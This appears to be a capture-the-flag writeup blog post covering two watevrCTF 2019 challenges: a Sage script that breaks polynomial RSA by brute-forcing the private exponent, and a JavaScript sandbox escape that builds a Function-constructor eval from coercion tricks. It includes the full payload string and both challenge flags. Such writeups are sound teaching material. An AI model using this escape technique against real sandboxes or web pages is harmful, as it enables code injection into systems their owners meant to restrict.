= yaml =
title: watevrCTF 2019 Writeups
slug: watevrctf-2019-writeups
date: 16/12/2019
tags: ctf,infosec,writeup,crypto,web
= yaml =

#### Challenges:
  - Crypto
    - Swedish RSA
  - Web
    - SuperSandbox

# Swedish RSA

### Crypto

> Also known as Polynomial RSA. This is just some abstract algebra for fun!

```python
flag = bytearray(raw_input())
flag = list(flag)
length = len(flag)
bits = 16

## Prime for Finite Field.
p = random_prime(2^bits-1, False, 2^(bits-1))

file_out = open("downloads/polynomial_rsa.txt", "w")
file_out.write("Prime: " + str(p) + "\n")

## Univariate Polynomial Ring in y over Finite Field of size p
R.<y> = PolynomialRing(GF(p))

## Analogous to the primes in Z
def gen_irreducable_poly(deg):
    while True:
        out = R.random_element(degree=deg)
        if out.is_irreducible():
            return out


## Polynomial "primes"
P = gen_irreducable_poly(ZZ.random_element(length, 2*length))
Q = gen_irreducable_poly(ZZ.random_element(length, 2*length))

## Public exponent key
e = 65537

## Modulus
N = P*Q
file_out.write("Modulus: " + str(N) + "\n")

## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)
S.<x> = R.quotient(N)

## Encrypt
m = S(flag)
c = m^e

file_out.write("Ciphertext: " + str(c))
file_out.close()
```

```python
Prime: 43753
Modulus: 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814
Ciphertext: 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659
```

---

RSA with polynomials! Referring to [this very good paper](http://www.diva-portal.se/smash/get/diva2:823505/FULLTEXT01.pdf), we see that everything is pretty much identical to standard RSA, except a detail in the private exponent computation:

Let $P(x), Q(x) \in \Z_p[x]$ be the RSA primes with $P(x)$ of degree $n$ and $Q(x)$ of degree $m$. The private exponent is the number of invertible polynomials in $Z_p[x]$ which is given by $s = (p^m-1)(p^n-1)$.

We are given the modulus so we know the value of $m + n$ (the degree of the modulus). Since $m + n = 177$, we can comfortably bruteforce possible combinations of $m$ and $n$ and compute a private exponent for each once, and see if any of those decrypt the ciphertext to our flag.

Solution script (sage):

```python
from gmpy2 import invert, gcd

p = 43753
e = 65537
R.<y> = PolynomialRing(GF(p))
N = '...'
S.<x> = R.quotient(N)
c = '...'

def get_pot_d():
    potential_d = []
    for m in range(1, 177):
        for n in range(1, 177):
            s = (pow(p, m) - 1)*(pow(p, n) - 1)
            if gcd(s, e) == 1:
                potential_d.append(invert(e, s))
    return list(set(potential_d))

for d in get_pot_d():
    m = c^d
    f = ''.join(chr(c) for c in m if c < 255)
    if 'watev' in f:
        print(f)
```

After running for a couple minutes, we get the flag: `watevr{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro}`

---

# SuperSandbox

### Web

> This has to be safe, right?
>
> `http://13.48.130.30:50000`

---

The website serves a html page with the following javascript:

```js
let code = location.search.slice(6);
        
let env = {
    a: (x, y) => x[y],
    b: (x, y) => x + y,
    c: (x) => !x,
    d: []
};

for (let i=0; i<code.length; i+=4) {
    let [dest, fn, arg1, arg2] = code.substr(i, 4);
    
    let res = env[fn](env[arg1], env[arg2]);
    
    env[dest] = res;
}
```

We are told if we can make the code execute `alert(1)` we get given the flag. Even though there are only 3 operations available, we are lucky because JS is very weird. For example, `[]+[]` evaluates to the empty string `''` and `![]+[]` evaluates to `'false'`. Using these, and similar constructs, we can form strings and store them within the `env` object.

For example, to store the string `'a'` in "register" `'z'`:

- We first notice that `'a'` is in `'false'` at index `1`
- We can compute `1` with `!![]+![]` (`true + false`)
- So we get `'a' == (![]+[])[!![]+![]]`
- Converting this to the language of the challenge, we'd get something like: `fcd_Fbfdtcf_zbtfzaFz`

We continue a similar tedious process to write code for other characters we may need. Some other things that were of good use:

- `[][[]] == undefined` so `[][[]] + [] == 'undefined'`
- `[]['filter'] == [Function: filter]` so `[]['filter'] + [] == 'function filter() { [native code] }'`
- `[]['filter']['constructor'](c) == (c) => eval(c)`
- `[]['filter']['constructor']('alert(1)')()` causes `alert(1)` to execute

Solution script (ugly):

```js
function c_setup_tf() {
    // E['t'] = true E['T'] = 'true'
    // E['F'] = 'false' E['f'] = false
    var c = ''
    c += 'tcd_' // E['t'] = ![] = false
    c += 'tct_' // E['t'] = !false = true
    c += 'fct_' // E['f'] = !true = false
    c += 'Tbtd' // E['T'] = true + [] = 'true'
    c += 'Fbfd' // E['F'] = false + [] = 'false'
    return c
}

function c_save_num(num, o) {
    //produces code to save the specified num to the given o
    // assumes tf is setup ('t', 'T', 'f', 'F')
    // positive integers only and very slow
    if(num == 0) {
        return o+'bff'
    }
    var c = ''
    c += o+'btf' // E[o] = 1
    var n = 1
    for(var i = 0; i < Math.floor(Math.log2(num)); i++) {
        c += o+'b'+o+o // E[o] = 2*E[o]
        n *= 2
    }
    for(var i = n; i < num; i++) {
        c += o+'b'+o+'t' // E[o] = 1
    }
    return c
}

function c_save_fstr(r1, o) {
    var c = ''
    c += c_save_char('f', o)
    c += c_save_char('i', r1)
    c += o+'b'+o+r1
    c += c_save_char('l', r1)
    c += o+'b'+o+r1
    c += c_save_char('t', r1)
    c += o+'b'+o+r1
    c += c_save_char('e', r1)
    c += o+'b'+o+r1
    c += c_save_char('r', r1)
    c += o+'b'+o+r1
    // E[o] = 'filter'
    c += r1+'ad'+o // E[r1] = [Function: filter]
    c += o+'b'+r1+'d' // E[r1] = 'function filter() { [native code] }'
    return c
}

const grp = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'] 

function c_save_char(chr, o, fr=grp) {
    // produces code to save the specified chr to the given o
    // assumes tf is setup ('t', 'T', 'f', 'F')
    // uses only the registers in fr (array) for intermediatary results
    if(chr == 'a') {
        var c = ''
        c += c_save_num(1, fr[0]) // E[fr[0]] = 1
        c += o+'aF'+fr[0] // E[o] = 'false'[1] = 'a'
        return c
    }
    if(chr == 'c') {
        var c = '' 
        c += c_save_fstr(fr[fr.length - 2], o) // E[o] = 'function filter() { [native code] }'
        c += c_save_num(3, fr[0]) // E[fr[0]] = 3
        c += o+'a'+o+fr[0] // E[o] = 'func...'[3] = 'c'
        return c
    }
    if(chr == 'e') {
        var c = ''
        c += c_save_num(3, fr[0]) // E[fr[0]] = 3
        c += o+'aT'+fr[0] // E[o] = 'true'[3] = 'e'
        return c
    }
    if(chr == 'f') {
        var c = ''
        c += c_save_num(0, fr[0]) // E[fr[0]] = 0
        c += o+'aF'+fr[0] // E[o] = 'false'[0] = 'f'
        return c
    }
    if(chr == 'i') {
        var c = ''
        c += fr[0]+'add' // E[fr[0]] = [[]] = undefined
        c += fr[0]+'b'+fr[0]+'d' // E[fr[0]] = [[]] + [] = 'undefined'
        c += c_save_num(5, fr[1]) // E[fr[1]] = 5
        c += o+'a'+fr[0]+fr[1] // E[o] = 'undefined'[5] = 'i'
        return c
    }
    if(chr == 'l') {
        var c = ''
        c += c_save_num(2, fr[0]) // E[fr[0]] = 2
        c += o+'aF'+fr[0] // E[o] = 'false'[2] = 'l'
        return c
    }
    if(chr == 'n') {
        var c = ''
        c += fr[0]+'add' // E[fr[0]] = [[]] = undefined
        c += fr[0]+'b'+fr[0]+'d' // E[fr[0]] = [[]] + [] = 'undefined'
        c += c_save_num(1, fr[1]) // E[fr[1]] = 1
        c += o+'a'+fr[0]+fr[1] // E[p] = 'undefined'[1] = 'n'
        return c
    }
    if(chr == 'o') {
        var c = '' 
        c += c_save_fstr(fr[fr.length - 2], o) // E[o] = 'function filter() { [native code] }'
        c += c_save_num(6, fr[0]) // E[fr[0]] = 3
        c += o+'a'+o+fr[0] // E[o] = 'func...'[6] = 'o'
        return c
    }
    if(chr == 'r') {
        var c = ''
        c += c_save_num(1, fr[0]) // E[fr[0]] = 1
        c += o+'aT'+fr[0] // E[o] = 'true'[1] = 'r'
        return c
    }
    if(chr == 's') {
        var c = ''
        c += c_save_num(3, fr[0]) // E[fr[0]] = 3
        c += o+'aF'+fr[0] // E[o] = 'false'[3] = 's'
        return c
    }
    if(chr == 't') {
        var c = ''
        c += c_save_num(0, fr[0]) // E[fr[0]] = 0
        c += o+'aT'+fr[0] // E[o] = 'true'[0] = 't'
        return c
    }
    if(chr == 'u') {
        var c = ''
        c += c_save_num(2, fr[0]) // E[fr[0]] = 2
        c += o+'aT'+fr[0] // E[o] = 'true'[2] = 'u'
        return c
    }
    if(chr == '(') {
        var c = '' 
        c += c_save_fstr(fr[fr.length - 2], o) // E[o] = 'function filter() { [native code] }'
        c += c_save_num(15, fr[0]) // E[fr[fr.length - 1]] = 6
        c += o+'a'+o+fr[0] // E[o] = 'func...'[15] = '('
        return c
    }
    if(chr == ')') {
        var c = '' 
        c += c_save_fstr(fr[fr.length - 2], o) // E[o] = 'function filter() { [native code] }'
        c += c_save_num(16, fr[0]) // E[fr[fr.length - 1]] = 6
        c += o+'a'+o+fr[0] // E[o] = 'func...'[16] = ')'
        return c
    }
    if(chr == '1') {
        var c = ''
        c += c_save_num(1, fr[0]) // E[fr[0]] = 1
        c += o+'b'+fr[0]+'d' // E[o] = 1 + [] = '1'
        return c
    }
}

function c_save_str(str, o, fr=grp) {
    var c = ''
    c += c_save_char(str[0], o, fr)
    for(var i = 1; i < str.length; i++) {
        c += c_save_char(str[i], fr[fr.length - 1], fr)
        c += o+'b'+o+fr[fr.length - 1]
    }
    return c
}

//goal: []['filter']['constructor']('alert(1)')()
var c = ''
c += c_setup_tf()
c += c_save_str('filter', 'Q')
c += c_save_str('constructor', 'W')
c += c_save_str('alert(1)', 'E')
c += 'R'+'adQ' // E['R'] = []['filter']
c += 'R'+'aRW' // E['R'] = []['filter']['constructor']
c += c_save_char('a', 'I') // E['I'] = 'a'
c += 'Y'+'RIE' // E['Y'] = []['filter']['constructor']('a', 'alert(1)')
c += 'z'+'RIE' // E['z'] = eval('a', 'alert(1)')
c += 'X'+'zaE' // E['X'] = eval('a', 'alert(1)')()
```

Payload:

```
tcd_tct_fct_TbtdFbfd1bffQaF11add1b1d2btf2b222b222b2t0a12QbQ01btf1b110aF1QbQ01bff0aT1QbQ01btf1b111b1t0aT1QbQ01btf0aT1QbQ01bffWaF11add1b1d2btf2b222b222b2t9a12WbW91btf1b119aF1WbW91bff9aT1WbW91btf1b111b1t9aT1WbW91btf9aT1WbW99adWWb9d1btf1b111b1tWaW11bff0aF11add1b1d2btf2b222b222b2t9a120b091btf1b119aF10b091bff9aT10b091btf1b111b1t9aT10b091btf9aT10b099ad00b9d1btf1b111b111b1t1b1t0a01WbW01add1b1d2btf0a12WbW01btf1b111b1t0aF1WbW01bff0aT1WbW01btf0aT1WbW01btf1b110aT1WbW01bff0aF11add1b1d2btf2b222b222b2t9a120b091btf1b119aF10b091bff9aT10b091btf1b111b1t9aT10b091btf9aT10b099ad00b9d1btf1b111b1t0a01WbW01bff0aT1WbW01bff0aF11add1b1d2btf2b222b222b2t9a120b091btf1b119aF10b091bff9aT10b091btf1b111b1t9aT10b091btf9aT10b099ad00b9d1btf1b111b111b1t1b1t0a01WbW01btf0aT1WbW01btfEaF11btf1b110aF1EbE01btf1b111b1t0aT1EbE01btf0aT1EbE01bff0aT1EbE01bff0aF11add1b1d2btf2b222b222b2t9a120b091btf1b119aF10b091bff9aT10b091btf1b111b1t9aT10b091btf9aT10b099ad00b9d1btf1b111b111b111b1t1b1t1b1t1b1t1b1t1b1t1b1t0a01EbE01btf0b1dEbE01bff0aF11add1b1d2btf2b222b222b2t9a120b091btf1b119aF10b091bff9aT10b091btf1b111b1t9aT10b091btf9aT10b099ad00b9d1btf1b111b111b111b110a01EbE0RadQRaRW1btfIaF1YRIEzRIEXzaE
```

Flag: `watevr{6ur13d_1n_th3_j4v4scr1pt_s4nd60x}`

---

I did think about writing a [JSFuck](http://www.jsfuck.com/) transpiler but ended up just doing most of the work manually
